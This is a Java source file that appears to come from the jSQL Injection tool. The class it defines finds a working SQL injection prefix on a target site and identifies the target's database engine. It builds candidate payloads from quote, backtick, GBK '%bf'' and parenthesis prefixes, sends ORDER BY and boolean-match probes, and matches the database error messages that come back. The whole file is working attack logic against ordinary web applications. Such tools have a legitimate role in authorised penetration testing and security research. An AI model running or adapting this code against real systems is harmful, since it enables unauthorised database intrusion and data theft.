package com.jsql.model.suspendable;

import com.jsql.model.InjectionModel;
import com.jsql.view.subscriber.Seal;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.injection.strategy.blind.InjectionCharInsertion;
import com.jsql.model.injection.engine.MediatorEngine;
import com.jsql.model.injection.engine.model.Engine;
import com.jsql.model.suspendable.callable.CallablePageSource;
import com.jsql.util.I18nUtil;
import com.jsql.util.LogLevelUtil;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.*;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.regex.Pattern;
import java.util.stream.Stream;

/**
 * Runnable class, define insertionCharacter to be used during injection,
 * i.e -1 in "...php?id=-1 union select...", sometimes it's -1, 0', 0, etc.
 * Find working insertion char when error message occurs in source.
 * Force to 1 if no insertion char works and empty value from user,
 * Force to user's value if no insertion char works,
 * Force to insertion char otherwise.
 */
public class SuspendableGetCharInsertion extends AbstractSuspendable {
    
    private static final Logger LOGGER = LogManager.getRootLogger();

    private static final String LABEL_PREFIX = "prefix";

    public SuspendableGetCharInsertion(InjectionModel injectionModel) {
        super(injectionModel);
    }

    @Override
    public String run(Input input) throws JSqlException {
        String characterInsertionByUser = input.payload();
        
        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().threadUtil().getExecutor("CallableGetInsertionCharacter");
        CompletionService<CallablePageSource> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

        var charFromBooleanMatch = new String[1];
        List<String> charactersInsertion = this.initCallables(taskCompletionService, charFromBooleanMatch);
        
        var mediatorEngine = this.injectionModel.getMediatorEngine();
        LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Fingerprinting database and character insertion using ORDER BY (step 3)...");

        String charFromOrderBy = null;
        
        int total = charactersInsertion.size();
        while (0 < total) {
            if (this.isSuspended()) {
                throw new StoppedByUserSlidingException();
            }
            try {
                CallablePageSource currentCallable = taskCompletionService.take().get();
                total--;
                String pageSource = currentCallable.getContent();
                
                List<Engine> enginesOrderByMatches = this.getEnginesOrderByMatch(mediatorEngine, pageSource);
                if (!enginesOrderByMatches.isEmpty()) {
                    if (this.injectionModel.getMediatorEngine().getEngineByUser() == this.injectionModel.getMediatorEngine().getAuto()) {
                        this.setEngine(mediatorEngine, enginesOrderByMatches);
                        this.injectionModel.sendToViews(new Seal.ActivateEngine(mediatorEngine.getEngine()));
                    }
                    
                    charFromOrderBy = currentCallable.getCharacterInsertion();
                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Found character insertion [{}] using ORDER BY and compatible with Error strategy", charFromOrderBy);
                    break;
                }
            } catch (InterruptedException e) {
                LOGGER.log(LogLevelUtil.IGNORE, e, e);
                Thread.currentThread().interrupt();
            } catch (ExecutionException e) {
                LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
            }
        }
        this.injectionModel.getMediatorUtils().threadUtil().shutdown(taskExecutor);
        if (charFromOrderBy == null && charFromBooleanMatch[0] != null) {
            charFromOrderBy = charFromBooleanMatch[0];
        }
        return this.getCharacterInsertion(characterInsertionByUser, charFromOrderBy);
    }

    private void setEngine(MediatorEngine mediatorEngine, List<Engine> enginesOrderByMatches) {
        if (
            enginesOrderByMatches.size() == 1
            && enginesOrderByMatches.getFirst() != mediatorEngine.getEngine()
        ) {
            mediatorEngine.setEngine(enginesOrderByMatches.getFirst());
        } else if (enginesOrderByMatches.size() > 1) {
            if (enginesOrderByMatches.contains(mediatorEngine.getPostgres())) {
                mediatorEngine.setEngine(mediatorEngine.getPostgres());
            } else if (enginesOrderByMatches.contains(mediatorEngine.getMysql())) {
                mediatorEngine.setEngine(mediatorEngine.getMysql());
            } else {
                mediatorEngine.setEngine(enginesOrderByMatches.getFirst());
            }
        }
    }

    private List<Engine> getEnginesOrderByMatch(MediatorEngine mediatorEngine, String pageSource) {
        return mediatorEngine.getEnginesForFingerprint()
            .stream()
            .filter(engine -> engine != mediatorEngine.getAuto())
            .filter(engine -> StringUtils.isNotEmpty(
                engine.instance().getModelYaml().getStrategy().getConfiguration().getFingerprint().getOrderByErrorMessage()
            ))
            .filter(engine -> {
                Optional<String> optionalOrderByErrorMatch = Stream.of(
                    engine.instance().getModelYaml().getStrategy().getConfiguration().getFingerprint().getOrderByErrorMessage()
                    .split("[\\r\\n]+")
                )
                .filter(errorMessage ->
                    Pattern
                    .compile(".*" + errorMessage + ".*", Pattern.DOTALL)
                    .matcher(pageSource)
                    .matches()
                )
                .findAny();
                if (optionalOrderByErrorMatch.isPresent()) {
                    LOGGER.log(
                        LogLevelUtil.CONSOLE_SUCCESS,
                        "Found [{}] using ORDER BY",
                        engine
                    );
                }
                return optionalOrderByErrorMatch.isPresent();
            })
            .toList();
    }

    private List<String> initCallables(CompletionService<CallablePageSource> taskCompletionService, String[] charFromBooleanMatch) throws JSqlException {
        List<String> prefixValues = Arrays.asList(
            RandomStringUtils.secure().next(10, "012"),  // to trigger probable failure
            "1"  // to trigger eventual success
        );
        List<String> prefixQuotes = Arrays.asList(
            SuspendableGetCharInsertion.LABEL_PREFIX +"'",
            SuspendableGetCharInsertion.LABEL_PREFIX,
            SuspendableGetCharInsertion.LABEL_PREFIX +"`",  // TODO add ITs
            SuspendableGetCharInsertion.LABEL_PREFIX +"\"",
            SuspendableGetCharInsertion.LABEL_PREFIX +"%bf'"  // GBK slash encoding use case
        );
        List<String> prefixParentheses = Arrays.asList(StringUtils.EMPTY, ")", "))");
        List<String> charactersInsertion = new ArrayList<>();
        LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Fingerprinting character insertion using boolean match (step 2)...");
        for (String prefixValue: prefixValues) {
            for (String prefixQuote: prefixQuotes) {
                for (String prefixParenthesis: prefixParentheses) {
                    this.checkInsertionChar(charFromBooleanMatch, charactersInsertion, prefixValue, prefixQuote, prefixParenthesis);
                }
            }
        }
        for (String characterInsertion: charactersInsertion) {
            taskCompletionService.submit(
                new CallablePageSource(
                    characterInsertion
                    + StringUtils.SPACE  // covered by cleaning
                    + this.injectionModel.getMediatorEngine().getEngine().instance().sqlOrderBy(),
                    characterInsertion,
                    this.injectionModel,
                    "prefix#orderby"
                )
            );
        }
        return charactersInsertion;
    }

    private void checkInsertionChar(
        String[] charFromBooleanMatch,
        List<String> charactersInsertion,
        String prefixValue,
        String prefixQuote,
        String prefixParenthesis
    ) throws StoppedByUserSlidingException {
        String characterInsertion = prefixQuote.replace(SuspendableGetCharInsertion.LABEL_PREFIX, prefixValue) + prefixParenthesis;
        charactersInsertion.add(characterInsertion);
        // Skipping Boolean match when already found
        if (charFromBooleanMatch[0] == null) {
            var injectionCharInsertion = new InjectionCharInsertion(
                this.injectionModel,
                characterInsertion,
                prefixQuote + prefixParenthesis
            );
            if (injectionCharInsertion.isInjectable()) {
                if (this.isSuspended()) {
                    throw new StoppedByUserSlidingException();
                }
                charFromBooleanMatch[0] = characterInsertion;
                LOGGER.log(
                    LogLevelUtil.CONSOLE_SUCCESS,
                    "Found character insertion [{}] using boolean match",
                    () -> charFromBooleanMatch[0]
                );
            }
        }
    }
    
    private String getCharacterInsertion(String characterInsertionByUser, String characterInsertionDetected) {
        String characterInsertionDetectedFixed = characterInsertionDetected;
        if (characterInsertionDetectedFixed == null) {
            characterInsertionDetectedFixed = characterInsertionByUser;
            String logCharacterInsertion = characterInsertionDetectedFixed;
            LOGGER.log(
                LogLevelUtil.CONSOLE_ERROR,
                "No character insertion found, forcing to [{}]",
                () -> logCharacterInsertion.replace(InjectionModel.STAR, StringUtils.EMPTY)
            );
        } else if (!characterInsertionByUser.replace(InjectionModel.STAR, StringUtils.EMPTY).equals(characterInsertionDetectedFixed)) {
            String characterInsertionByUserFormat = characterInsertionByUser.replace(InjectionModel.STAR, StringUtils.EMPTY);
            LOGGER.log(
                LogLevelUtil.CONSOLE_DEFAULT,
                "Disable search for char insertion in Preferences or use star * to force value [{}]",
                () -> characterInsertionByUserFormat
            );
        } else {
            LOGGER.log(
                LogLevelUtil.CONSOLE_INFORM,
                "{} [{}]",
                () -> I18nUtil.valueByKey("LOG_USING_INSERTION_CHARACTER"),
                () -> characterInsertionDetected.replace(InjectionModel.STAR, StringUtils.EMPTY)
            );
        }
        return characterInsertionDetectedFixed;
    }
}